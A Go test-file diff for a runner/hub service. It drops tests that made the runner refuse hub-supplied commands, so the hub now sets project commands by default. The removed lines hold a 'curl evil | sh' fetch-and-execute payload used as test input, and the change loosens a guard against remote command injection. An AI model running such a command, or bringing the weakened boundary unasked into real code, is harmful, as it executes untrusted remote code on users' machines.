@@ -76,34 +76,22 @@ func TestRunnerOffersTheHubOnlyItsProjects(t *testing.T) {
 	}
 }
 
-func TestRunnerRefusesCommandsFromTheHub(t *testing.T) {
+// A runner takes the hub's commands, but opens terminals only for its owner
+// and adds projects only inside its projects root.
+func TestRunnerGuardsTheHubsRequests(t *testing.T) {
 	parallel(t)
 
 	s, h, p := runnerServer(t)
 	procs := "/api/projects/" + p.ID + "/processes"
 
-	if w := hubCall(h, "POST", procs, `{"kind":"task","command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
-		t.Fatalf("ad-hoc command: %d %s", w.Code, w.Body)
-	}
-	if w := hubCall(h, "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "-hub-commands") {
+	if w := hubCall(h, "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "register it again") {
 		t.Fatalf("terminal: %d %s", w.Code, w.Body)
-	}
-	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"test_command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
-		t.Fatalf("changing a command: %d %s", w.Code, w.Body)
-	}
-	if w := hubCall(h, "POST", "/api/projects", `{"name":"x","setup_command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
-		t.Fatalf("new project with a command: %d %s", w.Code, w.Body)
 	}
 	if w := hubCall(h, "POST", "/api/projects", `{"name":"x","path":"/etc"}`); w.Code != http.StatusForbidden {
 		t.Fatalf("adopting a directory outside the projects root: %d %s", w.Code, w.Body)
 	}
 	if w := hubCall(h, "POST", "/api/projects", `{"name":"x","path":"`+filepath.Join(s.ProjectRoot, "..", "escape")+`"}`); w.Code != http.StatusForbidden {
 		t.Fatalf("adopting via ..: %d %s", w.Code, w.Body)
-	}
-
-	// The settings form sends every field: unchanged commands pass.
-	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"name":"renamed","test_command":"go test ./...","run_command":""}`); w.Code != http.StatusOK {
-		t.Fatalf("saving settings with the commands unchanged: %d %s", w.Code, w.Body)
 	}
 
 	// Terminals started on the runner itself stay there.
@@ -115,15 +103,14 @@ func TestRunnerRefusesCommandsFromTheHub(t *testing.T) {
 		t.Fatalf("attaching to a terminal: %d %s", w.Code, w.Body)
 	}
 
-	// With -hub-commands the hub may.
-	s.HubCommands = true
+	// The hub sets the project's commands.
 	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"test_command":"make test"}`); w.Code != http.StatusOK {
-		t.Fatalf("-hub-commands: %d %s", w.Code, w.Body)
+		t.Fatalf("changing a command: %d %s", w.Code, w.Body)
 	}
 }
 
-// With -hub-commands a runner opens terminals for the hub, but only for the
-// user who registered it (tunnel.UserHeader, which the hub sets and strips
+// A runner opens terminals for the hub, but only for the user who
+// registered it (tunnel.UserHeader, which the hub sets and strips
 // from browsers' requests), and only in its project's checkout or a task's
 // worktree: the hub doesn't choose the folder.
 func TestRunnerOpensTerminalsForItsOwnerOnly(t *testing.T) {
@@ -141,10 +128,6 @@ func TestRunnerOpensTerminalsForItsOwnerOnly(t *testing.T) {
 		return w
 	}
 
-	if w := as("42", "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "-hub-commands") {
-		t.Fatalf("terminal without -hub-commands: %d %s", w.Code, w.Body)
-	}
-	s.HubCommands = true
 	if w := as("42", "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "register it again") {
 		t.Fatalf("terminal on a runner that doesn't know its owner: %d %s", w.Code, w.Body)
 	}
